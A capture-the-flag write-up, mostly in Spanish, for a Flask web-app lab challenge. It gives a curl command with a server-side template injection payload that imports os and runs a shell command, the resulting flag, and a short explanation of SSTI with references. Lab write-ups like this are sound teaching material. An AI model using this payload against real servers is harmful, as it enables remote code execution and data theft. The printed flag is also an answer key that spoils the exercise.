## Descripción
I found a web app that can help process images: PNG images only!

Try it [here](http://xebec.cylabacademy.net:18970/)!
```
1. Abrir la terminal de comandos y configurar la variable con la URL de la instancia activa (`BASE`).
2. Enviar una petición POST utilizando `curl` con un payload de SSTI dirigido al objeto `request` de Flask para importar el módulo `os` y ejecutar `cat flag`.
3. Comando utilizado:
   ```bash
   BASE="http://<url-instancia>/"
   curl -s -c cookies.txt -b cookies.txt -L -X POST "$BASE/" --data-urlencode "content={{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}"
```

4. La respuesta del servidor mostrará la página renderizada con el contenido de la bandera dentro del código HTML.
    

**Solución:** academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}

## Notas adicionales
Las vulnerabilidades de SSTI ocurren cuando los motores de plantillas evalúan de forma insegura las entradas controladas por el usuario como código ejecutable del servidor.

## Referencias

- PortSwigger Web Security Academy - SSTI: https://portswigger.net/web-security/server-side-template-injection
    
- Flask Documentation: https://flask.palletsprojects.com/
